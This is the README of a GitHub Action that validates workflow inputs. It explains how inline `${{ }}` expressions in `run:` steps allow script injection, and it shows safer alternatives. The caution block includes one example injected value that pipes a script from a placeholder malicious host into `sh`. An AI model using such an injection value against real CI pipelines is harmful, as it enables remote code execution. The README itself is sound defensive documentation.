# validate-inputs


> [!CAUTION]
> Using run commands in github actions like `- run: echo "Hello ${{ input.name }}"` is not safe.
> It allows for any user with write access to run arbitrary scripts, called untrusted inline expression injection (often called GitHub Actions Command/Script Injection).
> If someone can inject a script like: `John"; curl https://malicious-script.com/script.sh | sh`, and that can runs in your CI!
> Even referencing github isses can be insecure `run: echo "${{ github.event.issue.title }}"`.

What is not safe:
```yaml
# allows for script inject!
- run: echo "Hello ${{ input.name }}"
```

This is the recommended approach:
```yaml

- run: echo "Hello $NAME"
  env:
    NAME: ${{ input.name }}
```


This action provides an alternative approach:

```yaml
# errors if name is not alphanumeric
- uses: jordanst3wart/validate-input@7abeaf955fc6fc6cd467f638768df59fa5d80d2d
  with:
    value: ${{ inputs.name }}
          
# safe to call with run commands, shell commands can normally be injected here
- run: echo "Hello ${{ input.name }}"
```

# More information

https://github.blog/security/supply-chain-security/four-tips-to-keep-your-github-actions-workflows-secure/
